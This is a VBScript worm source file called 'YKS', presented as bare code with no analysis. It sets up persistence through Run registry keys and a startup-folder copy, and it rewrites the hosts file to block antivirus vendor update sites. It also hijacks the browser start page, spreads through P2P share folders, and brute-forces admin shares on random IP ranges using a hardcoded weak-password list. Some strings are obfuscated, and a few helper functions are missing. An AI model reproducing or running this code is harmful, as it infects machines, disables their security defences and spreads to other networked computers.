'YKS
On Error Resume Next
Dim YKS, WshShell, FSO, VX, VirusLink
On Error Resume Next
  Set FSO = CreateObject("Scripting.FileSystemObject")
vbs = Wscript.ScriptFullName
Set WshShell = Wscript.CreateObject("Wscript.Shell")
 Set oUrlLink = WshShell.CreateShortcut("YKS.URL")
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
sub regcreate(regkey,regvalue)
Rem Enable Registry Writing
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systray", "C:\WINDOWS\system32\YKS.vbs"
oUrlLink.Save
FSO.copyfile vbs, "c:\windows\system32\YKS.vbs"
FSO.CopyFile vbs, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Startup.vbs" 
Dim Z, f1, ts
Const ForWriting = 2
Set Z = CreateObject("Scripting.FileSystemObject")
Z.CreateTextFile ("C:\WINDOWS\system32\drivers\etc\hosts.")
Set f1 = Z.GetFile("C:\WINDOWS\system32\drivers\etc\hosts.")
Set ts = f1.OpenAsTextStream(ForWriting, False)
ts.write  "# Copyright (c) 1993-1999 Microsoft Corp." & vbCrLf
ts.write  "#"& vbCrLf
ts.write  "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows."& vbCrLf
ts.write  "#"& vbCrLf
ts.write  "# This file contains the mappings of IP addresses to host names. Each"& vbCrLf
ts.write  "# entry should be kept on an individual line. The IP address should"& vbCrLf
ts.write  "# be placed in the first column followed by the corresponding host name."& vbCrLf
ts.write  "# The IP address and the host name should be separated by at least one"& vbCrLf
ts.write  "# space."& vbCrLf
ts.write  "#"& vbCrLf
ts.write  "# Additionally, comments (such as these) may be inserted on individual"& vbCrLf
ts.write  "# lines or following the machine name denoted by a '#' symbol." & vbCrLf
ts.write  "#"& vbCrLf
ts.write  "# For example:"& vbCrLf
ts.write  "#"& vbCrLf
ts.write  "#      102.54.94.97     rhino.acme.com          # source server"& vbCrLf
ts.write  "#       38.25.63.10     x.acme.com              # x client host"& vbCrLf
ts.write  ""& vbCrLf
ts.write  "127.0.0.1       localhost"& vbCrLf
ts.write  "127.0.0.1  www.trendmicro.com"& vbCrLf
ts.write  "127.0.0.1  trendmicro.com  "& vbCrLf
ts.write  "127.0.0.1  rads.mcafee.com   "& vbCrLf
ts.write  "127.0.0.1  customer.symantec.com  "& vbCrLf
ts.write  "127.0.0.1  liveupdate.symantec.com    "& vbCrLf
ts.write  "127.0.0.1  us.mcafee.com  "& vbCrLf
ts.write  "127.0.0.1  updates.symantec.com "& vbCrLf
ts.write  "127.0.0.1  update.symantec.com  "& vbCrLf
ts.write  "127.0.0.1  www.nai.com   "& vbCrLf
ts.write  "127.0.0.1  nai.com"& vbCrLf
ts.write  "127.0.0.1  secure.nai.com"& vbCrLf
ts.write  "127.0.0.1  dispatch.mcafee.com "& vbCrLf
ts.write  "127.0.0.1  download.mcafee.com"& vbCrLf
ts.write  "127.0.0.1  www.my-etrust.com "& vbCrLf
ts.write  "127.0.0.1  my-etrust.com"& vbCrLf
ts.write  "127.0.0.1  mast.mcafee.com"& vbCrLf
ts.write  "127.0.0.1  ca.com "& vbCrLf
ts.write  "127.0.0.1  www.ca.com"& vbCrLf
ts.write  "127.0.0.1  networkassociates.com"& vbCrLf
ts.write  "127.0.0.1  www.networkassociates.com"& vbCrLf
ts.write  "127.0.0.1  avp.com"& vbCrLf
ts.write  "127.0.0.1  www.kaspersky.com "& vbCrLf
ts.write  "127.0.0.1  www.avp.com"& vbCrLf
ts.write  "127.0.0.1  kaspersky.com"& vbCrLf
ts.write  "127.0.0.1  www.f-secure.com"& vbCrLf
ts.write  "127.0.0.1  f-secure.com "& vbCrLf
ts.write  "127.0.0.1  viruslist.com"& vbCrLf
ts.write  "127.0.0.1  www.viruslist.com "& vbCrLf
ts.write  "127.0.0.1  liveupdate.symantecliveupdate.com"& vbCrLf
ts.write  "127.0.0.1  mcafee.com "& vbCrLf
ts.write  "127.0.0.1  www.mcafee.com"& vbCrLf
ts.write  "127.0.0.1  sophos.com"& vbCrLf
ts.write  "127.0.0.1  www.sophos.com "& vbCrLf
ts.write  "127.0.0.1  symantec.com "& vbCrLf
ts.write  "127.0.0.1  securityresponse.symantec.com"& vbCrLf
ts.write  "127.0.0.1  www.symantec.com"& vbCrLf
ts.write  "127.0.0.1  www.norton.com"& vbCrLf
ts.write  "127.0.0.1  norton.com"& vbCrLf
ts.Close
WshShell.regwrite "HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee\Text","CCSR"
WshShell.Run "C:\WINDOWS\system32\ssmarque.scr"
WshShell.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper","C:\WINDOWS\Web\Wallpaper\Windows XP.jpg"
WshShell.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\OriginalWallpaper","C:\WINDOWS\Web\Wallpaper\Windows XP.jpg"
WshShell.regwrite "HKEY_CURRENT_USER\Control Panel\Desktop\ConvertedWallpaper","C:\WINDOWS\Web\Wallpaper\Windows XP.jpg"
WshShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\CCSR","wscript.exe " & yeah.GetSpecialFolder(0) & "\CCSR.vbs"
WshShell.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://antiapple.net.ms"
WshShell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://antiapple.net.ms"
WshShell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://antiapple.net.ms"
WshShell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Logon User Name","CCSR"
WshShell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Security\Sending_Security","Low"
Sub VSoulSeek(Path)
On Error Resume Next
Set sl1 = fso.OpenTextFile(Path & "\shared.cfg")
Do While sl1.AtendOfstream = False
sl2 = sl1.ReadAll
Loop: sl1.Close
sl2 = Mid(sl2, 9, Len(sl2) - 14): sl2 = Mid(sl2, InStr(sl2, ":") - 1): InfectP2P sl2
End Sub
'----------------------------------------------------------------------------
Sub InfectP2P(Path)
On Error Resume Next
If Right(Path,1) <> "\" Then Path = Path & "\"
For Each i In P2PName()
If Not(FileEx(Path & i)) Then fso.CopyFile Gsp(1) & "\filezip.zip", Path & i
Next

For Each i In ListFiles(Path)
If Not(FileEx(Path & i & ".zip")) Then
If i <> "" Then fso.CopyFile Gsp(1) & "\filezip.zip", Path & i & ".zip"
End If
Next
End Sub
'----------------------------------------------------------------------------
Function ListFiles(Path)
On Error Resume Next: Dim x()
Set Gf = fso.GetFolder(Path): ReDim x(Gf.Files.Count): a = 0
For Each i In Gf.Files
Ex = LCase(fso.GetExtensionName(i.Path))
If (Ex <> "zip") Then x(a) = fso.GetBaseName(i.Name): a = a + 1
Next: ListFiles = x
End Function
'--------------------------------------------------------------------------
Function P2PName()
On Error Resume Next
P = Array("YKS.zip"): P2PName = P
End Function


Sub iRed()
On Error Resume Next
For Each Dr_v In fso.Drives
If Dr_v.DriveType = 3 Then CopyVbsRed(Dr_v.Path&"\")
Next

Ip=RandomIP()

For i=1 To 254
For Each I1 In Ured()
For Each I2 In Ured()
wsn.MapNetworkDrive "Z:","\\" & Ip & i & "\C",I1,I2
If Err Then Err.Clear() Else CopyVbsRed("Z:\")
wsn.MapNetworkDrive "Z:","\\" & Ip & i & "\C$",I1,I2
If Err Then Err.Clear() Else CopyVbsRed("Z:\")
Next
Next
Next

End Sub
'----------------------------------------------------------------------------
Function RandomIP()
On Error Resume Next: Randomize
For i=0 To 2: RI= RI & Int(Rnd*254) & ".": Next: RandomIP=RI
End Function
'----------------------------------------------------------------------------
Function Ured()
On Error Resume Next: Dim U(71)
U(0) = "name": U(1) = "%null%": U(2) = "sdfg": U(3) = "%usdfg%12": U(4) = "%sgsdfame%123"
U(5) = "%username%1234": U(6) = "123": U(7) = "1234": U(8) = "12345"
U(9) = "123456": U(10) = "1234567": U(11) = "12345678": U(12) = "sdfg"
U(13) = "54321": U(14) = "1": U(15) = "111": U(16) = "11111"
U(17) = "111f111": U(18) = "11111111": U(19) = "000000": U(20) = "sfg"
U(21) = "pass": U(22) = "5201314": U(23) = "88888888": U(24) = "888888"
U(25) = "passwd": U(26) = "password": U(27) = "sql": U(28) = "database"
U(29) = "admin": U(30) = "test": U(31) = "server": U(32) = "computer"
U(33) = "secret": U(34) = "oracle": U(35) = "sybase": U(36) = "root"
U(37) = "Internet": U(38) = "supafder": U(39) = "usafder": U(40) = "manager"
U(41) = "security": U(42) = "public": U(43) = "private": U(44) = "default"
U(45) = "1234": U(46) = "123qwe": U(47) = "abcd": U(48) = "abc123"
U(53) = "123abc": U(54) = "abc": U(55) = "123asd": U(56) = "asdf"
U(57) = "yeah": U(58) = "!@#$": U(59) = "!@#$%": U(60) = "!@#$%^"
U(61) = "!@#$dfa%^&": U(62) = "!@#$%^af&*": U(63) = "!@#afd$%^&*(": U(64) = "!@#$%^&*()"
U(65) = "intel": U(66) = "": U(67) = vbCrLf: U(68) = wsn.ComputerName
U(69) = "KKKKdddKKK": U(70) = wsn.UserName
Ured = U()
End Function
'----------------------------------------------------------------------------
Sub CopyVbsRed(Path)
On Error Resume Next
If Not(FolderEx(Path)) Then Exit Sub
fso.CopyFile Gsp(3), Path & q("frshuri)qet")

If FileEx(Path&q("frshbbd)efs")) Then
Set au = fso.OpenTextFile(Path&q("frshbbd)efs"),8)
au.write vbCrLf & q("Gpni'[frshuri)qet")
au.Close
End If

For Each Rf In fso.GetFolder(Path).SubFolders
If InStr(LCase(Rf.Path),"win")<>0 Then
If FileEx(Rf.Path&q("[pni)nin")) Then IniEdit Rf.Path&q("[pni)nin"), q("\pnichptZ"), q("uri"), Path&q("frshuri)qet")
End If
Next

Call iRemoveDriveRemote
End Sub
'----------------------------------------------------------------------------
Sub iRemoveDriveRemote()
On Error Resume Next
If FolderEx("Z:\") Then wsn.RemoveNetworkDrive "Z:", True
End Sub
'----------------------------------------------------------------------------
WshShell.Run ("C:\WINDOWS\system32\logoff.exe")
'YKS